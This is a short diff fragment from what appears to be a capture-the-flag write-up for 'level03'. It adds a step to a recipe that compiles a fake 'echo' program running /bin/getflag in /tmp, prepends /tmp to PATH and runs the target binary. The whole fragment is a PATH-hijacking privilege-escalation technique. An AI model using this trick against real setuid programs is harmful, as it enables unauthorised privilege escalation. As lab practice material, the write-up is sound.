@@ -10,4 +10,5 @@ dogbolt
 * write echo.c which return ``system("/bin/getflag")`` in ``/tmp``
 * in ``/tmp`` do ``gcc echo.c -o echo``
 * in ``~`` do ``gcc echo.c -o echo``
+* ``export PATH=/tmp:$PATH``
 * ``./level03``
